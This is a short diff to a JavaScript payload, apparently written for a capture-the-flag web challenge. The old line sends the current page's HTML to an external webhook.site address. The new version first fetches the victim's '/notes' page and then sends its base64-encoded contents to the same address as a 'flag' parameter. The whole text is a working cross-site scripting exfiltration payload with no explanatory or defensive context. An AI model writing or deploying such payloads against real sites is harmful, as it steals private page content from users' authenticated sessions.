@@ -1,1 +1,5 @@
-fetch('https://webhook.site/8cb65efc-852a-48d7-94c3-06e51c4aff4c?flag=' + btoa(document.documentElement.innerHTML));
+fetch('/notes')
+  .then(r => r.text())
+  .then(html => {
+    fetch('https://webhook.site/8cb65efc-852a-48d7-94c3-06e51c4aff4c?flag=' + btoa(html));
+  });
